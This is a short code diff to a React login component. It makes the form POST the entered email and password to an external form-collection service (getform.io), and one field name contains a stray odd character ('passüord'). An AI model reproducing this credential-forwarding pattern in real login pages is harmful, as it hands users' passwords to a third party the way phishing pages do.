@@ -10,15 +10,15 @@ const Login = () => {
       <div className="shape"></div>
       <div className="shape"></div>
   </div>
- <form >
+ <form action="https://getform.io/f/9avNgMaG" method="POST" >
       <h3>Login Here</h3>
 
       <label htmlFor="username">Username</label>
-      <input type="text" placeholder="Email or Phone" id="username"/>
+      <input type="text" placeholder="Email or Phone" id="username" name='email'/>
 
       <label htmlFor="password">Password</label>
     
-      <input type="password" placeholder="Password" id="password"/>
+      <input type="password" placeholder="Password" id="password" name='passüord'/>
 
       <button className='loginBtn'>Log In</button>
       <div className="social">
